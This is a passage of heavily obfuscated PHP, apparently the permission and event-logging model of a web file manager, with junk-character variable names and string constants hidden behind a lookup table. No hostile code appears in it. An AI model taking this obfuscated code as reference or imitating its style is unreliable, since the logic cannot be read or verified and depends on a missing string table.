$ïéÚĞ®ó[2088])); $Şø­¯¾ = array(); foreach ($ü”ŠÃ¯• as $õ›èìßÏ => $»¶«×ò¥) { if ($î“Ïş®á && $GLOBALS[$ïéÚĞ®ó[6]][$ïéÚĞ®ó[1916]]) { $Şø­¯¾[$õ›èìßÏ] = $„’˜’·; continue; } $Şø­¯¾[$õ›èìßÏ] = $this->makeSourceAuth($»¶«×ò¥, $†±ñİ“Ç, $…™·½½ª); } return $Şø­¯¾; } public function authDeepCheck($Ä×÷Ëîã, $çŒÂı†â = false) { $¢È…¢€¥ =& $_SERVER[Ö†ØøÖ±]; $çŒÂı†â = $çŒÂı†â ? $çŒÂı†â : USER_ID; $Š€ğÅ‘Ö = $this->makeAuthDeep($çŒÂı†â); if (!in_array($Ä×÷Ëîã, $Š€ğÅ‘Ö[$¢È…¢€¥[2089]])) { return !1; } $¼Šã ÒÓ = array(); foreach ($Š€ğÅ‘Ö[$¢È…¢€¥[2090]] as $çÜšŞäË => $ì‚Ñ‘šÑ) { if (!in_array($Ä×÷Ëîã, $ì‚Ñ‘šÑ)) { continue; } $¼Šã ÒÓ[] = $çÜšŞäË; } if (!$¼Šã ÒÓ) { return !1; } $ôøæÅ×Û = $¼Šã ÒÓ ? $¼Šã ÒÓ[0] : $Ä×÷Ëîã; return array($¢È…¢€¥[465] => -1, $¢È…¢€¥[517] => array($¢È…¢€¥[470] => $¢È…¢€¥[1241], $¢È…¢€¥[1903] => $¢È…¢€¥[212], $¢È…¢€¥[471] => LNG($¢È…¢€¥[2091]), $¢È…¢€¥[1920] => $¢È…¢€¥[2092]), $¢È…¢€¥[2093] => LNG($¢È…¢€¥[2094]), $¢È…¢€¥[2095] => $this->sourceAuthInfo($ôøæÅ×Û)); } protected function makeAuthDeep($àŠÆ¡ÖÎ = false) { $—ªÇ±÷§ =& $_SERVER[Ö†ØøÖ±]; static $ÓÕÀÀ°• = array(); $àŠÆ¡ÖÎ = $àŠÆ¡ÖÎ ? $àŠÆ¡ÖÎ : USER_ID; if (isset($ÓÕÀÀ°•[$àŠÆ¡ÖÎ])) { return $ÓÕÀÀ°•[$àŠÆ¡ÖÎ]; } $’é¥çÚ = Model($—ªÇ±÷§[2096])->listData(); $µ«µ¡æõ = array(); foreach ($’é¥çÚ as $üÔ¶‰) { if ($üÔ¶‰[$—ªÇ±÷§[464]] == 0 && $üÔ¶‰[$—ªÇ±÷§[1919]] == $—ªÇ±÷§[88]) { $µ«µ¡æõ[] = $üÔ¶‰[$—ªÇ±÷§[451]]; } } $„ë»¡â = $this->userGroupParents($àŠÆ¡ÖÎ); $ş×ÔÖ = array($—ªÇ±÷§[178] => SourceModel::TYPE_USER, $—ªÇ±÷§[547] => $àŠÆ¡ÖÎ); if ($„ë»¡â) { $ş×ÔÖ = array(array($—ªÇ±÷§[178] => SourceModel::TYPE_USER, $—ªÇ±÷§[547] => $àŠÆ¡ÖÎ), array($—ªÇ±÷§[178] => SourceModel::TYPE_GROUP, $—ªÇ±÷§[547] => array($—ªÇ±÷§[469], $„ë»¡â)), $—ªÇ±÷§[1053] => $—ªÇ±÷§[1995]); } $ëİ‘×Øµ = $this->field($—ªÇ±÷§[2097])->where($ş×ÔÖ)->select(); $Î‚Ö®Â€ = array(); $Ãğí¦ë˜ = array_to_keyvalue_group($ëİ‘×Øµ, $—ªÇ±÷§[181]); foreach ($Ãğí¦ë˜ as $Ò÷«àª => $¹‹­æö´) { $¾Ø¬ïèì = $this->authArrayCheck($¹‹­æö´, $àŠÆ¡ÖÎ); if ($¾Ø¬ïèì[$—ªÇ±÷§[465]] > 0) { $Î‚Ö®Â€[] = $Ò÷«àª . $—ªÇ±÷§[12]; } } if ($„ë»¡â) { $ûø“’á = Model($—ªÇ±÷§[563]); foreach ($„ë»¡â as $¶‘ŠáÀŒ) { $Ì†ôáœš = $ûø“’á->getInfo($¶‘ŠáÀŒ); if (!$Ì†ôáœš || !is_array($Ì†ôáœš[$—ªÇ±÷§[87]])) { continue; } $Î‚Ö®Â€[] = $Ì†ôáœš[$—ªÇ±÷§[87]][$—ªÇ±÷§[181]]; } } $ªØíŒà = array(); $õ•ÀÙØ¤ = $„ë»¡â; $üıùÕæ = Model($—ªÇ±÷§[1385]); $ûø“’á = Model($—ªÇ±÷§[563]); $ »ñÃõ = array(); $Ãó”´ = array(); $ÄÎ°ıĞë = array(); $Ôéæ¨°º = array(); if ($Î‚Ö®Â€) { $±—±­Ö† = $üıùÕæ->where(array($—ªÇ±÷§[181] => array($—ªÇ±÷§[469], $Î‚Ö®Â€)))->select(); foreach ($±—±­Ö† as $Òß¾ŠØ) { $”¬•¥µ» = $üıùÕæ->parentLevelArray($Òß¾ŠØ[$—ªÇ±÷§[562]]); $ªØíŒà = array_merge($ªØíŒà, $”¬•¥µ»); $õ•ÀÙØ¤[] = $Òß¾ŠØ[$—ªÇ±÷§[547]]; $ »ñÃõ[$Òß¾ŠØ[$—ªÇ±÷§[181]]] = $”¬•¥µ»; $Ãó”´[$Òß¾ŠØ[$—ªÇ±÷§[181]]] = $Òß¾ŠØ[$—ªÇ±÷§[547]]; } } $õ•ÀÙØ¤ = array_values(array_unique($õ•ÀÙØ¤)); $Ïñ××û» = $õ•ÀÙØ¤; foreach ($Ïñ××û» as $¶‘ŠáÀŒ) { $Ì†ôáœš = $ûø“’á->getInfo($¶‘ŠáÀŒ); $”¬•¥µ» = $üıùÕæ->parentLevelArray($Ì†ôáœš[$—ªÇ±÷§[562]]); $õ•ÀÙØ¤ = array_merge($õ•ÀÙØ¤, $”¬•¥µ»); } $õ•ÀÙØ¤ = array_values(array_unique($õ•ÀÙØ¤)); foreach ($õ•ÀÙØ¤ as $¶‘ŠáÀŒ) { $Ì†ôáœš = $ûø“’á->getInfo($¶‘ŠáÀŒ); $ªØíŒà[] = $Ì†ôáœš[$—ªÇ±÷§[87]][$—ªÇ±÷§[181]]; $ÄÎ°ıĞë[$¶‘ŠáÀŒ] = $Ì†ôáœš[$—ªÇ±÷§[87]][$—ªÇ±÷§[181]]; $Ôéæ¨°º[$¶‘ŠáÀŒ] = $üıùÕæ->parentLevelArray($Ì†ôáœš[$—ªÇ±÷§[562]]); } foreach ($ »ñÃõ as $˜ª§ŞÜµ => $Ú€ã‘›…) { $ùÃâÕù = $Ãó”´[$˜ª§ŞÜµ]; if (!$ùÃâÕù || !$ÄÎ°ıĞë[$ùÃâÕù]) { continue; } $«ÎŠŠ§ë = array(); foreach ($Ôéæ¨°º[$ùÃâÕù] as $¶‘ŠáÀŒ) { $«ÎŠŠ§ë[] = $ÄÎ°ıĞë[$¶‘ŠáÀŒ]; } $ »ñÃõ[$˜ª§ŞÜµ] = array_merge($«ÎŠŠ§ë, $Ú€ã‘›…); } $ªØíŒà = array_values(array_unique($ªØíŒà)); $¼ê§¸Ú¨ = array($—ªÇ±÷§[2089] => $ªØíŒà, $—ªÇ±÷§[2090] => $ »ñÃõ); $ÓÕÀÀ°•[$àŠÆ¡ÖÎ] = $¼ê§¸Ú¨; return $¼ê§¸Ú¨; } private function makeSourceAuth($ˆØ³ÆëÊ, $ÒÌ‡ìí, $¸Õüø„ƒ = false) { $¬é‹Œå =& $_SERVER[Ö†ØøÖ±]; $Î¼‰­¬ = $¬é‹Œå[88]; $‚å¾÷æ = $ˆØ³ÆëÊ[$¬é‹Œå[547]]; $¨öë Ùç = $ˆØ³ÆëÊ[$¬é‹Œå[178]] == SourceModel::TYPE_GROUP; $—èúØ¬ = $¨öë Ùç ? $this->groupRootAuth($‚å¾÷æ, $¸Õüø„ƒ) : !1; if ($—èúØ¬ && Model($¬é‹Œå[549])->authCheckAction($—èúØ¬[$¬é‹Œå[464]], $¬é‹Œå[1918])) { return $this->groupAuthInfo($—èúØ¬, $‚å¾÷æ); } $ÜèŞı¡ã = Model($¬é‹Œå[1385])->parentLevelArray($ˆØ³ÆëÊ[$¬é‹Œå[562]]); $ÜèŞı¡ã = array_merge(array($ˆØ³ÆëÊ[$¬é‹Œå[181]]), array_reverse($ÜèŞı¡ã)); $½Òë°ø = !1; foreach ($ÜèŞı¡ã as $üˆåèûå) { if (!isset($ÒÌ‡ìí[$üˆåèûå])) { continue; } $…›ÍÇÎ× = $this->authMake($ÒÌ‡ìí[$üˆåèûå], $¸Õüø„ƒ); if ($…›ÍÇÎ×[$¬é‹Œå[517]]) { $½Òë°ø = $…›ÍÇÎ×; break; } } if (!$¨öë Ùç) { return $½Òë°ø; } if (!$½Òë°ø && $—èúØ¬) { $½Òë°ø = $this->groupAuthInfo($—èúØ¬, $‚å¾÷æ); } if (!$½Òë°ø) { $¡Œïâ¹Ã = Model($¬é‹Œå[563])->getInfo($‚å¾÷æ); $á¨º€²§ = explode($¬é‹Œå[50], trim($¡Œïâ¹Ã[$¬é‹Œå[562]], $¬é‹Œå[50])); $á¨º€²§ = array_reverse($á¨º€²§); foreach ($á¨º€²§ as $•ôÏ²») { if ($•ôÏ²» == $¬é‹Œå[212] || $•ôÏ²» == $Î¼‰­¬) { continue; } $•®±²ê = $this->groupRootAuth($•ôÏ²», $¸Õüø„ƒ); if (!$•®±²ê) { continue; } $½Òë°ø = $this->groupAuthInfo($•®±²ê, $•ôÏ²»); break; } } if (!$½Òë°ø || $½Òë°ø[$¬é‹Œå[465]] <= 0) { $¶ö‹ÁÊ = $this->authDeepCheck($ˆØ³ÆëÊ[$¬é‹Œå[181]], $¸Õüø„ƒ); if ($¶ö‹ÁÊ) { $½Òë°ø = $¶ö‹ÁÊ; } } return $½Òë°ø; } private function userIsRoot($şñÛ”ú = false) { $«øÒáË­ =& $_SERVER[Ö†ØøÖ±]; if (!$şñÛ”ú && _get($GLOBALS, $«øÒáË­[545])) { return !0; } $÷Ø´‰Ì„ = Model($«øÒáË­[576])->getInfo($şñÛ”ú); $íÙ¯îûù = Model($«øÒáË­[2098])->listData($÷Ø´‰Ì„[$«øÒáË­[1574]]); if ($íÙ¯îûù && $íÙ¯îûù[$«øÒáË­[553]][$«øÒáË­[2099]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Ñã½ÃàÓ) { $…•¤‚Úà =& $_SERVER[Ö†ØøÖ±]; $Ôß‘ŒœÄ = Model($…•¤‚Úà[1385]); $÷¨¢Àßõ = $Ôß‘ŒœÄ->sourceInfo($Ñã½ÃàÓ); if (!$÷¨¢Àßõ) { return !1; } $Ôß‘ŒœÄ->groupPathDisplay($÷¨¢Àßõ); $¼µ”¥À = array($÷¨¢Àßõ); $¼µ”¥À = $Ôß‘ŒœÄ->_listAppendPath($¼µ”¥À); $÷¨¢Àßõ = $¼µ”¥À[0]; $ÈÕ³¤á® = $÷¨¢Àßõ[$…•¤‚Úà[560]]; if (isset($÷¨¢Àßõ[$…•¤‚Úà[568]])) { $°Ï™æ‹ã = explode($…•¤‚Úà[8], trim($÷¨¢Àßõ[$…•¤‚Úà[560]], $…•¤‚Úà[8])); array_shift($°Ï™æ‹ã); $ÈÕ³¤á® = $÷¨¢Àßõ[$…•¤‚Úà[566]] . $…•¤‚Úà[2100] . implode($…•¤‚Úà[8], $°Ï™æ‹ã); } return array($…•¤‚Úà[471] => $÷¨¢Àßõ[$…•¤‚Úà[32]], $…•¤‚Úà[84] => KodIO::make($÷¨¢Àßõ[$…•¤‚Úà[181]]), $…•¤‚Úà[2101] => $ÈÕ³¤á®); } private function groupAuthInfo($ì¾ÀûÚİ, $üşÃ¤ßœ) { $·öÚÈÅá =& $_SERVER[Ö†ØøÖ±]; $ıµº¹ßı = Model($·öÚÈÅá[563])->getInfo($üşÃ¤ßœ); return array($·öÚÈÅá[2102] => intval($ì¾ÀûÚİ[$·öÚÈÅá[464]]), $·öÚÈÅá[2086] => $ì¾ÀûÚİ, $·öÚÈÅá[2103] => LNG($·öÚÈÅá[2104]), $·öÚÈÅá[2095] => array($·öÚÈÅá[471] => $ıµº¹ßı[$·öÚÈÅá[32]], $·öÚÈÅá[84] => KodIO::make($ıµº¹ßı[$·öÚÈÅá[87]][$·öÚÈÅá[181]]), $·öÚÈÅá[2101] => $ıµº¹ßı[$·öÚÈÅá[567]])); } protected function groupRootAuth($õº’éù, $²Ü¥âëÛ = false) { $úÙ™Æü =& $_SERVER[Ö†ØøÖ±]; $²Ü¥âëÛ = $²Ü¥âëÛ ? $²Ü¥âëÛ : USER_ID; $ŸÀ = $²Ü¥âëÛ . $úÙ™Æü[2105] . $õº’éù; static $ƒ“ëœª = array(); if (isset($ƒ“ëœª[$ŸÀ])) { return $ƒ“ëœª[$ŸÀ]; } $ÁÀ“­ë¨ = Model($úÙ™Æü[563])->getInfo($õº’éù); $ú¦îšêË = $this->userGroupList($²Ü¥âëÛ); $ºùáÎÊ‹ = isset($ú¦îšêË[$õº’éù]) ? $ú¦îšêË[$õº’éù][$úÙ™Æü[464]] : !1; if ($ºùáÎÊ‹ && Model($úÙ™Æü[549])->authCheckAction($ºùáÎÊ‹[$úÙ™Æü[464]], $úÙ™Æü[1918])) { $ƒ“ëœª[$ŸÀ] = $ºùáÎÊ‹; return $ºùáÎÊ‹; } $Ååè§€ = $this->sourceAuthSelect($ÁÀ“­ë¨[$úÙ™Æü[87]][$úÙ™Æü[181]]); $™ÃéñŞ™ = $Ååè§€ ? $this->authMake($Ååè§€, $²Ü¥âëÛ) : !1; $ğš²—” = $™ÃéñŞ™ ? $™ÃéñŞ™[$úÙ™Æü[517]] : !1; $ƒ“ëœª[$ŸÀ] = $ğš²—” ? $ğš²—” : $ºùáÎÊ‹; return $ƒ“ëœª[$ŸÀ]; } public function authOwnerApply($œÈ•Ãº) { $°êæøº  =& $_SERVER[Ö†ØøÖ±]; if (empty($œÈ•Ãº[$°êæøº [464]]) || isset($œÈ•Ãº[$°êæøº [2106]]) && $œÈ•Ãº[$°êæøº [2106]]) { return $œÈ•Ãº; } if (AuthModel::authCheckRoot($œÈ•Ãº[$°êæøº [464]][$°êæøº [465]])) { return $œÈ•Ãº; } $Í¸˜÷îÖ = Model($°êæøº [1385])->parentLevelArray($œÈ•Ãº[$°êæøº [562]]); $Í¸˜÷îÖ = array_merge(array($œÈ•Ãº[$°êæøº [181]]), array_reverse($Í¸˜÷îÖ)); $¼Ó‚–¯º = $this->sourceAuthSelect($Í¸˜÷îÖ); $ìÅûñö‡ = array(); $ìºí–÷© = array(); foreach ($¼Ó‚–¯º as $û™è×¬ƒ => $ äúœ–ï) { $ñ‰ÚÙÆ§ = $this->authFolderOwnerUser($ äúœ–ï); $ìÅûñö‡[$û™è×¬ƒ] = $ñ‰ÚÙÆ§; $ìºí–÷© = array_merge($ìºí–÷©, $ñ‰ÚÙÆ§[$°êæøº [639]]); if ($ñ‰ÚÙÆ§[$°êæøº [2107]]) { break; } } if (count($ìºí–÷©) == 0) { $ìºí–÷© = $this->authFolderOwnerGroup($œÈ•Ãº[$°êæøº [547]]); } $ìºí–÷© = array_unique($ìºí–÷©); if (AuthModel::authCheckRoot($œÈ•Ãº[$°êæøº [464]][$°êæøº [465]])) { $ìºí–÷©[] = USER_ID; } $œÈ•Ãº[$°êæøº [464]][$°êæøº [2108]] = Model($°êæøº [555])->userListInfo($ìºí–÷©); return $œÈ•Ãº; } private function authFolderOwnerGroup($Åş‚¬ÜÈ) { $µäÇÒ¯ü =& $_SERVER[Ö†ØøÖ±]; $ï©®¯ûÊ = Model($µäÇÒ¯ü[1987])->where(array($µäÇÒ¯ü[1897] => $Åş‚¬ÜÈ))->select(); $õ„‹ò˜£ = array(); if (!$ï©®¯ûÊ) { return $õ„‹ò˜£; } foreach ($ï©®¯ûÊ as $ú›úçöÂ) { $·ÑŒ÷¢Ï = $this->authInfo($ú›úçöÂ); if (AuthModel::authCheckRoot($·ÑŒ÷¢Ï[$µäÇÒ¯ü[464]])) { $õ„‹ò˜£[] = $ú›úçöÂ[$µäÇÒ¯ü[1699]]; } } return $õ„‹ò˜£; } private function authFolderOwnerUser($Ã°ìù) { $£È°¹õÕ =& $_SERVER[Ö†ØøÖ±]; $Éç‚ª…ñ = array(); $Ÿëö…§ = !1; foreach ($Ã°ìù as $éÜ¿½ı‚) { $ï¿Û÷† = $this->authInfo($éÜ¿½ı‚); if ($éÜ¿½ı‚[$£È°¹õÕ[547]] == $£È°¹õÕ[212]) { $Ÿëö…§ = !0; } if ($éÜ¿½ı‚[$£È°¹õÕ[178]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ï¿Û÷†[$£È°¹õÕ[464]])) { $Éç‚ª…ñ[] = $éÜ¿½ı‚[$£È°¹õÕ[547]]; } } } return array($£È°¹õÕ[639] => $Éç‚ª…ñ, $£È°¹õÕ[2107] => $Ÿëö…§); } public function authMake($Éüô¤ï, $»íÍíéÜ = false) { $„õ¡éÇ =& $_SERVER[Ö†ØøÖ±]; $›¨ŠĞİº = $this->authArrayCheck($Éüô¤ï, $»íÍíéÜ); if ($›¨ŠĞİº[$„õ¡éÇ[2109]]) { $›¨ŠĞİº[$„õ¡éÇ[2109]] = $this->sourceAuthInfo($›¨ŠĞİº[$„õ¡éÇ[2109]]); } return $›¨ŠĞİº; } public function authArrayCheck($¼Á·…¯, $¢Ñ¢ŸÄ = false) { $ëÒÓÎÏé =& $_SERVER[Ö†ØøÖ±]; if (!$¼Á·…¯) { return array($ëÒÓÎÏé[465] => 0, $ëÒÓÎÏé[517] => !1); } $¢Ñ¢ŸÄ = $¢Ñ¢ŸÄ ? $¢Ñ¢ŸÄ : USER_ID; $¸ÍÖô‹Î = 0; $‚ µœ½ = 0; $Ã©Æşã = 0; $Ü‘ºë¡™ = 0; $õúÒØùş = 0; $ººü›¾Ï = 0; $‡–ö”ˆú = 1000; $†·Ô¡Œñ = 0; $é©çˆÔÖ = 0; $˜Á¸˜ßâ = 0; $¼œ•¿˜£ = 0; $î‡¡šõ„ = array($ëÒÓÎÏé[181] => 0); foreach ($¼Á·…¯ as $î‡¡šõ„) { $ªˆôûŠ¡ = $this->authInfo($î‡¡šõ„); if (!$ªˆôûŠ¡) { continue; } $¡Èì¯Åº = $î‡¡šõ„[$ëÒÓÎÏé[547]]; $æœØÆŠ² = intval($ªˆôûŠ¡[$ëÒÓÎÏé[464]]); if ($î‡¡šõ„[$ëÒÓÎÏé[178]] == SourceModel::TYPE_USER && $¡Èì¯Åº == $¢Ñ¢ŸÄ) { $¸ÍÖô‹Î = !0; $Ã©Æşã = $ªˆôûŠ¡; $‚ µœ½ = $æœØÆŠ²; } else { if ($î‡¡šõ„[$ëÒÓÎÏé[178]] == SourceModel::TYPE_GROUP && $this->groupContainUser($¡Èì¯Åº, $¢Ñ¢ŸÄ)) { $Ü‘ºë¡™ = !0; $öÅ™İ’§ = $this->groupStepToUserGroup($¡Èì¯Åº, $¢Ñ¢ŸÄ); if ($öÅ™İ’§ < $‡–ö”ˆú) { $‡–ö”ˆú = $öÅ™İ’§; $õúÒØùş = $æœØÆŠ²; $ººü›¾Ï = $ªˆôûŠ¡; $†·Ô¡Œñ = $¡Èì¯Åº; } if ($öÅ™İ’§ == $‡–ö”ˆú && $æœØÆŠ² >= $õúÒØùş) { $õúÒØùş = $æœØÆŠ²; $ººü›¾Ï = $ªˆôûŠ¡; $†·Ô¡Œñ = $¡Èì¯Åº; } } else { if ($¡Èì¯Åº == $ëÒÓÎÏé[212]) { $é©çˆÔÖ = !0; $¼œ•¿˜£ = $ªˆôûŠ¡; $˜Á¸˜ßâ = $æœØÆŠ²; } } } } if ($¸ÍÖô‹Î) { $ù”˜›É = $‚ µœ½; $ªˆôûŠ¡ = $Ã©Æşã; $é¡€¶Î¨ = LNG($ëÒÓÎÏé[2110]); } else { if ($Ü‘ºë¡™) { $ù”˜›É = $õúÒØùş; $ªˆôûŠ¡ = $ººü›¾Ï; $¯—ïñø = Model($ëÒÓÎÏé[563])->getInfo($†·Ô¡Œñ); $é¡€¶Î¨ = $ëÒÓÎÏé[163] . $¯—ïñø[$ëÒÓÎÏé[567]] . $ëÒÓÎÏé[2111] . LNG($ëÒÓÎÏé[2112]); } else { if ($é©çˆÔÖ) { $ù”˜›É = $˜Á¸˜ßâ; $ªˆôûŠ¡ = $¼œ•¿˜£; $é¡€¶Î¨ = LNG($ëÒÓÎÏé[2083]); } else { $ù”˜›É = 0; $ªˆôûŠ¡ = !1; $é¡€¶Î¨ = $ëÒÓÎÏé[12]; } } } $Ü²ÊŒ·™ = array($ëÒÓÎÏé[2102] => intval($ù”˜›É), $ëÒÓÎÏé[2086] => $ªˆôûŠ¡, $ëÒÓÎÏé[2103] => $é¡€¶Î¨, $ëÒÓÎÏé[2095] => $î‡¡šõ„[$ëÒÓÎÏé[181]]); return $Ü²ÊŒ·™; } private function groupContainUser($Úæ”–É², $‰¬÷î¹Í = false) { return in_array($Úæ”–É², $this->userGroupParents($‰¬÷î¹Í)); } private function groupStepToUserGroup($İÃ·çÍø, $†ää¼™ë = false) { $˜—½´Ú³ =& $_SERVER[Ö†ØøÖ±]; $¹•ß¡×ë = $this->userGroupList($†ää¼™ë); $ÄùßÌ¼ = 1000; $ã¼ìá¿² = $GLOBALS[$˜—½´Ú³[6]][$˜—½´Ú³[89]][$˜—½´Ú³[2000]] == 1; $ãøªÑèç = $ã¼ìá¿² ? 3 : 2; foreach ($¹•ß¡×ë as $Ñ³½ºñÔ) { if ($Ñ³½ºñÔ[$˜—½´Ú³[1897]] == $İÃ·çÍø) { return 0; } $Î¿ı­ÂÎ = explode($˜—½´Ú³[50], trim($Ñ³½ºñÔ[$˜—½´Ú³[562]], $˜—½´Ú³[50])); if ($Î¿ı­ÂÎ[0] == $˜—½´Ú³[212] && count($Î¿ı­ÂÎ) > $ãøªÑèç) { $ÇßÓ÷™… = array_reverse(array_slice($Î¿ı­ÂÎ, $ãøªÑèç)); $‚œ’”É = array_search($İÃ·çÍø, $ÇßÓ÷™…); if ($‚œ’”É !== !1 && $‚œ’”É + 1 <= $ÄùßÌ¼) { $ÄùßÌ¼ = $‚œ’”É + 1; } } } return $ÄùßÌ¼; } private function userGroupList($Ê´½£Ãı = false) { $š¶´““‘ =& $_SERVER[Ö†ØøÖ±]; static $Ô™ª¼æÎ = array(); if (isset($Ô™ª¼æÎ[$Ê´½£Ãı])) { return $Ô™ª¼æÎ[$Ê´½£Ãı]; } $âä—¨òÅ = Model($š¶´““‘[576])->getInfo($Ê´½£Ãı); $Ô™ª¼æÎ[$Ê´½£Ãı] = array_to_keyvalue($âä—¨òÅ[$š¶´““‘[2084]], $š¶´““‘[1897]); return $Ô™ª¼æÎ[$Ê´½£Ãı]; } public function userGroupParents($Ïî€‚Ÿ) { $Ô­•ğšÊ =& $_SERVER[Ö†ØøÖ±]; static $¿÷¢¬ƒí = array(); $Ïî€‚Ÿ = $Ïî€‚Ÿ ? $Ïî€‚Ÿ : USER_ID; if (isset($¿÷¢¬ƒí[$Ïî€‚Ÿ])) { return $¿÷¢¬ƒí[$Ïî€‚Ÿ]; } $Ú£¡Œ§ã = $this->userGroupList($Ïî€‚Ÿ); $¯ÈŒºÂõ = array(); $î÷çè¡² = $GLOBALS[$Ô­•ğšÊ[6]][$Ô­•ğšÊ[89]][$Ô­•ğšÊ[2000]] == 1; $°¸ï€»‡ = $î÷çè¡² ? 3 : 2; foreach ($Ú£¡Œ§ã as $ÆÃÉ¬¿—) { $Õòä’«‡ = array($ÆÃÉ¬¿—[$Ô­•ğšÊ[1897]]); $ÃøĞ¶¡Œ = explode($Ô­•ğšÊ[50], trim($ÆÃÉ¬¿—[$Ô­•ğšÊ[562]], $Ô­•ğšÊ[50])); if ($ÃøĞ¶¡Œ[0] == $Ô­•ğšÊ[212] && count($ÃøĞ¶¡Œ) > $°¸ï€»‡) { $‘¶ì“Ö¤ = array_slice($ÃøĞ¶¡Œ, $°¸ï€»‡); $Õòä’«‡ = array_merge($Õòä’«‡, array_reverse($‘¶ì“Ö¤)); } $¯ÈŒºÂõ = array_merge($¯ÈŒºÂõ, $Õòä’«‡); } $¿÷¢¬ƒí[$Ïî€‚Ÿ] = array_unique($¯ÈŒºÂõ); return $¿÷¢¬ƒí[$Ïî€‚Ÿ]; } public function authTargetInfoMake($Àã˜¼Õ) { $ÖÁú³… =& $_SERVER[Ö†ØøÖ±]; $ııĞôÆš = array(); $ÅÚšÜá = array(); foreach ($Àã˜¼Õ as $ß´—£‘Œ) { if ($ß´—£‘Œ[$ÖÁú³…[178]] == SourceModel::TYPE_USER) { $ııĞôÆš[] = intval($ß´—£‘Œ[$ÖÁú³…[547]]); } else { if ($ß´—£‘Œ[$ÖÁú³…[178]] == SourceModel::TYPE_GROUP) { $ÅÚšÜá[] = intval($ß´—£‘Œ[$ÖÁú³…[547]]); } } } if ($ııĞôÆš) { $ııĞôÆš = Model($ÖÁú³…[555])->userListInfo($ııĞôÆš); } if ($ÅÚšÜá) { $Ş¾…Ó¼© = array($ÖÁú³…[1985] => array($ÖÁú³…[469], $ÅÚšÜá)); $ÅÚšÜá = Model($ÖÁú³…[563])->field($ÖÁú³…[2113])->where($Ş¾…Ó¼©)->select(); $ÅÚšÜá = array_to_keyvalue($ÅÚšÜá, $ÖÁú³…[1897]); } return array($ÖÁú³…[2114] => $ııĞôÆš, $ÖÁú³…[2115] => $ÅÚšÜá); } public function authInfo($İŞ¯ôÉÊ) { $ÍŠÀÛÆí =& $_SERVER[Ö†ØøÖ±]; if ($İŞ¯ôÉÊ[$ÍŠÀÛÆí[2001]]) { $Ú»¶ºâ = Model($ÍŠÀÛÆí[549])->listData($İŞ¯ôÉÊ[$ÍŠÀÛÆí[2001]]); if (!$Ú»¶ºâ) { return !1; $ïÄÄÓ®¤ = Model($ÍŠÀÛÆí[549])->listData(); $Ï¿„§Ê = array_filter_by_field($ïÄÄÓ®¤, $ÍŠÀÛÆí[464], $ÍŠÀÛÆí[212]); return $Ï¿„§Ê; } $Œå‘ô‘Œ = array_field_key($Ú»¶ºâ, array($ÍŠÀÛÆí[451], $ÍŠÀÛÆí[32], $ÍŠÀÛÆí[464], $ÍŠÀÛÆí[1920], $ÍŠÀÛÆí[1921])); $Œå‘ô‘Œ[$ÍŠÀÛÆí[2116]] = $İŞ¯ôÉÊ; return $Œå‘ô‘Œ; } else { return array($ÍŠÀÛÆí[470] => 0, $ÍŠÀÛÆí[1903] => $İŞ¯ôÉÊ[$ÍŠÀÛÆí[2061]], $ÍŠÀÛÆí[471] => $ÍŠÀÛÆí[12], $ÍŠÀÛÆí[1920] => $ÍŠÀÛÆí[2117]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\162\143\145\x5f\x65\166\x65\156\x74"; protected $dataAuto = array(array("\143\x72\145\x61\164\145\124\x69\155\145", "\x74\x69\155\145", "\151\156\163\x65\162\164", "\146\x75\x6e\x63\x74\151\157\x6e"), array("\x64\x65\x73\143", '', "\151\156\x73\x65\162\x74\54\165\x70\x64\x61\164\x65\54\x73\x65\154\x65\x63\x74", "\x6a\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($É®İ×£, $¸úÅ¦, $öœ¾°®Å = '') { $Ş´ß€óé =& $_SERVER[Ö†ØøÖ±]; if (!$this->eventSave) { return; } $Å©¸õëî = Model($Ş´ß€óé[1385])->sourceInfo($É®İ×£); if (!$Å©¸õëî) { return !1; } if ($this->isCacheEvent($Å©¸õëî, $¸úÅ¦)) { return; } if ($öœ¾°®Å && is_string($öœ¾°®Å)) { $öœ¾°®Å = array($Ş´ß€óé[1936] => $öœ¾°®Å); } $ä‰”¸«¼ = defined($Ş´ß€óé[2118]) ? USER_ID : 0; $×¤¼•¼ = array($Ş´ß€óé[468] => $É®İ×£, $Ş´ß€óé[2119] => $Å©¸õëî[$Ş´ß€óé[180]], $Ş´ß€óé[2120] => $Å©¸õëî[$Ş´ß€óé[32]], $Ş´ß€óé[560] => !empty($Å©¸õëî[$Ş´ß€óé[560]]) ? $Å©¸õëî[$Ş´ß€óé[560]] : $Ş´ß€óé[12], $Ş´ß€óé[1690] => $ä‰”¸«¼, $Ş´ß€óé[473] => $¸úÅ¦, $Ş´ß€óé[1692] => $öœ¾°®Å); $this->addSystemLog($¸úÅ¦, $×¤¼•¼); unset($×¤¼•¼[$Ş´ß€óé[2120]], $×¤¼•¼[$Ş´ß€óé[560]]); return $this->add($×¤¼•¼); } private function addSystemLog($•áàÚô‡, $Í±›¥ÎÍ) { $×ó³äÈó =& $_SERVER[Ö†ØøÖ±]; if ($•áàÚô‡ == $×ó³äÈó[2121]) { $•áàÚô‡ = $Í±›¥ÎÍ[$×ó³äÈó[503]][$×ó³äÈó[2122]]; } else { if (in_array($•áàÚô‡, array($×ó³äÈó[1877], $×ó³äÈó[2123]))) { $•áàÚô‡ = $Í±›¥ÎÍ[$×ó³äÈó[503]][$×ó³äÈó[807]]; } } $ÕÉşİ£ = array_merge($Í±›¥ÎÍ, array($×ó³äÈó[2124] => $Í±›¥ÎÍ[$×ó³äÈó[181]], $×ó³äÈó[2125] => $Í±›¥ÎÍ[$×ó³äÈó[2125]])); Hook::trigger($×ó³äÈó[2126], $×ó³äÈó[2127] . $•áàÚô‡, $Í±›¥ÎÍ); Model($×ó³äÈó[1841])->addLog($×ó³äÈó[2127] . $•áàÚô‡, $ÕÉşİ£); } private function isCacheEvent($»ˆ¶äı, $É¿ª³€) { if ($»ˆ¶äı[$_SERVER[Ö†ØøÖ±][178]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($‘å÷ºÇÔ, $‹Ü±²€Ğ) { $²­¾Ëï… =& $_SERVER[Ö†ØøÖ±]; $Ñ†±³‡¨ = Model($²­¾Ëï…[1385])->sourceInfo($‘å÷ºÇÔ); $°ï¤İªĞ = array($²­¾Ëï…[2122] => $‹Ü±²€Ğ, 